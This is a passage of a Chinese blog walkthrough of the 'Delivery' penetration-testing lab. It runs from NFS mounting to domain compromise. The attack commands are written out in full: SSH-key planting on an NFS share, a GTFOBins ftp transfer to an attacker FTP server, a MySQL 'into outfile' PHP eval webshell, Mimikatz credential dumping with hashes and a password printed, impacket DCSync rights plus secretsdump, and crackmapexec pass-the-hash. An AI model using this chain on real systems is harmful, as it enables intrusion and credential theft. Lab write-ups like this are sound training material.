+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/n/nfs-utils/nfs-common_1.3.4-2.5ubuntu3_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/libn/libnfsidmap/libnfsidmap2_0.25-5.1ubuntu1_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc3_1.2.5-1_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/r/rpcbind/rpcbind_1.2.5-8_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/k/keyutils/keyutils_1.6-6ubuntu1_amd64.deb</span><br><span class="line">wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtirpc/libtirpc-common_1.2.5-1_all.deb</span><br><span class="line">sudo dpkg -i libnfsidmap2_0.25-5.1ubuntu1_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i libtirpc-common_1.2.5-1_all.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i libtirpc3_1.2.5-1_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i rpcbind_1.2.5-8_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i keyutils_1.6-6ubuntu1_amd64.deb &amp;&amp; \</span><br><span class="line">sudo dpkg -i nfs-common_1.3.4-2.5ubuntu3_amd64.deb</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/image-20250417204031931.png" alt="image-20250417204031931"></p>
+<p>挂载到tmp目录</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mount -t nfs 172.22.13.57:/home/joyce tmp</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>df -h</code>查看，挂在成功</p>
+<p><img src="/2024/07/30/hello-world/image-20250417204216467.png" alt="image-20250417204216467"></p>
+<p>接下来写公钥 ，ssh连接</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cd /tmp</span><br><span class="line">mkdir .ssh</span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /tmp/.ssh/authorized_keys</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/image-20250417205039774.png" alt="image-20250417205039774"></p>
+<p>根目录发现一个密码，flag权限不够</p>
+<p><code>xiaorang.lab/zhangwen\QT62f3gBhK1</code></p>
+<p>然后再看看ftp<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ftp/">ftp | GTFOBins</a></p>
+<p>外网主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 8888 -u test -P test -w </span><br></pre></td></tr></tbody></table></figure>
+
+<p>joyce</p>
+<p><img src="/2024/07/30/hello-world/image-20250417205740870.png" alt="image-20250417205740870"></p>
+<p><img src="/2024/07/30/hello-world/image-20250417205859846.png" alt="image-20250417205859846"></p>
+<p>拿到flag2和hint</p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><blockquote>
+<p>请尝试获取内网中运行 OA 系统的服务器权限，并获取该服务器上的机密文件。</p>
+</blockquote>
+<p>开始打数据库，navicat连接</p>
+<p><img src="/2024/07/30/hello-world/image-20250417210120764.png" alt="image-20250417210120764"></p>
+<p>查看有无写入权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">show variables like "secure_file_priv";</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/image-20250417210219815.png" alt="image-20250417210219815"></p>
+<p>结果为空说明有写入权限</p>
+<p>查找插件路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">show variables like "%plugin%";</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/image-20250417210313999.png" alt="image-20250417210313999"></p>
+<p>直接写webshell到C:\phpstudy_pro\www</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">select "&lt;?php eval($_POST[1]);phpinfo();?&gt;" into outfile "C:\\phpstudy_pro\\www\\shell.php";</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/image-20250417210359075.png" alt="image-20250417210359075"></p>
+<p>蚁剑连接拿flag</p>
+<p><img src="/2024/07/30/hello-world/image-20250417210518786.png" alt="image-20250417210518786"></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><blockquote>
+<p>由于域管理员错误的配置，导致域内某个用户拥有危险的 DACL。你的任务是找到该用户，并评估这个配置错误所带来的潜在危害。</p>
+</blockquote>
+<p>先新建个用户rdp上去方便以管理员身份操作</p>
+<p><img src="/2024/07/30/hello-world/image-20250417210718763.png" alt="image-20250417210718763"></p>
+<p>rdp上去，传猕猴桃抓哈希</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现一个用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">* Username : chenglei</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line">* SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line">* DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line"></span><br><span class="line">* Username : chenglei</span><br><span class="line">* Domain   : XIAORANG.LAB</span><br><span class="line">* Password : Xt61f3LBhg1</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看chenglei用户的权限</p>
+<p><img src="/2024/07/30/hello-world/image-20250417212022301.png" alt="image-20250417212022301"></p>
+<p>是ACL Admin组内成员也就是说chenglei用户有WriteDacl权限，所以说可以像exchange那样打：<code>我们直接给自己dsync权限，然后就可以dump到域管哈希了</code></p>
+<p>加权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-dacledit xiaorang.lab/chenglei:'Xt61f3LBhg1' -action write -rights DCSync -principal chenglei -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.13.6</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/image-20250417211808246.png" alt="image-20250417211808246"></p>
+<p>dump哈希</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q impacket-secretsdump xiaorang.lab/chenglei:Xt61f3LBhg1@WIN-DC.xiaorang.lab -target-ip 172.22.13.6 -just-dc-ntlm -history -user-status</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/image-20250417211833321.png" alt="image-20250417211833321"></p>
+<p>PTH</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.13.6 -u administrator -H6341235defdaed66fb7b682665752c9a -d xiaorang.lab -x "type Users\Administrator\flag\flag04.txt"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/image-20250417211850979.png" alt="image-20250417211850979"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/">https://p4tt0n.github.io/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/" title="春秋云镜Flarum"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">春秋云镜Flarum</div></div></a></div><div class="next-post pull-right"><a href="/2025/04/25/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="2022网鼎杯半决赛复盘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022网鼎杯半决赛复盘</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" title="春秋云镜Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">春秋云镜Initial</div></div></a></div><div><a href="/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/" title="Bugku渗透测试1-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-21</div><div class="title">Bugku渗透测试1-4</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/" title="春秋云镜Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Time</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/" title="春秋云镜Tsclient"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Tsclient</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cbrute4road/" title="春秋云镜brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜brute4road</div></div></a></div><div><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">春秋云镜Hospital</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery"><span class="toc-number">1.</span> <span class="toc-text">春秋云镜Delivery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">1.0.4.</span> <span class="toc-text">第四关</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CSpoofing/" title="春秋云镜Spoofing">春秋云镜Spoofing</a><time datetime="2025-04-25T06:39:33.000Z" title="发表于 2025-04-25 14:39:33">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/" title="春秋云镜Flarum">春秋云镜Flarum</a><time datetime="2025-04-25T06:38:19.000Z" title="发表于 2025-04-25 14:38:19">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/" title="春秋云镜Delivery">春秋云镜Delivery</a><time datetime="2025-04-25T06:36:39.000Z" title="发表于 2025-04-25 14:36:39">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="2022网鼎杯半决赛复盘">2022网鼎杯半决赛复盘</a><time datetime="2025-04-25T06:33:18.000Z" title="发表于 2025-04-25 14:33:18">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/11/2025%E5%B9%B4%E7%8D%AC%E8%B1%B8%E6%9D%AF%E6%9C%8D%E5%8A%A1%E5%99%A8wp/" title="2025年獬豸杯服务器wp">2025年獬豸杯服务器wp</a><time datetime="2025-04-11T11:59:20.000Z" title="发表于 2025-04-11 19:59:20">2025-04-11</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
